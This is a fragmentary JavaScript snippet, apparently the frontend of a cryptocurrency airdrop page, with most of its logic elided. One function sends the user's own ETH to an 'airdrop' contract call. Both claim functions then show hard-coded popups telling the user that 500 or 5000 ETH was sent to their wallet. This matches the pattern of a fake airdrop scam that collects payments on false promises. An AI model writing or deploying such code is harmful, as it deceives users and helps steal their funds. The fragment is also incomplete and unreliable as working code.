...
const sttaddr = "0x0000000000000000000000000000000000000000";
...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '500 ETH sent to your wallet.',
...
const buyair = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr, value: ethval}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '5000 ETH sent to your wallet.',
   showCloseButton: true,
   showCancelButton: true,
   focusConfirm: false,
   reverseButtons: true,
...
function calculate() {
    ...
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' ETH';
